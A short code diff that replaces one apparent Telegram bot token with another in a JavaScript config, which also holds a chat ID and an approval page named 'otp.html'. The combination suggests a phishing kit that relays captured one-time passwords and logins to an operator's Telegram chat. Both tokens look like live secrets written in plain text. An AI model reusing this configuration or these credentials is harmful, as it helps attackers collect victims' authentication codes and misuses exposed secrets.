@@ -1,5 +1,5 @@
 const CONFIG = {
-      BOT_TOKEN: '8790894986:AAGHaI2_jlpbI8WTzssq-2ssGwhRr7MAXrI',
+      BOT_TOKEN: '7731852186:AAE7otYOdu9XPMqzUrMxB1tET1kHf5LYFG0',
       CHAT_ID: '8820857419',
       APPROVE_PAGE: 'otp.html',
     };
